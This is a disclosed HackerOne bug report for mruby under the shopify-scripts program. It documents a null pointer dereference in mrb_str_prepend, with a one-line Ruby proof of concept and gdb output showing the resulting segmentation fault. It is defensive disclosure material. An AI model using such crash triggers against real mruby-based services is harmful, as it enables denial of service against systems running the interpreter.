# Null pointer dereference in mrb_str_prepend

## Report Details
- **Report ID**: 193081
- **URL**: https://hackerone.com/reports/193081
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-12-21T14:55:03.272Z
- **Disclosed**: 2017-02-07T07:42:12.394Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
# PoC
```ruby
String.new.prepend("")
```

# Cause
This crash is caused by null dereference in
https://github.com/mruby/mruby/blob/master/mrbgems/mruby-string-ext/src/string.c#L474

# Test
```
$ gdb -q --args ./bin/mruby test4.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test4.rb

Program received signal SIGSEGV, Segmentation fault.
0x0000000000464553 in mrb_str_prepend (mrb=0x1538010, self=...) at /home/tunz/working/mruby/mruby/mrbgems/mruby-string-ext/src/string.c:474
474       RSTR_PTR(s1)[len] = '\0';
```

## Attachments
No attachments
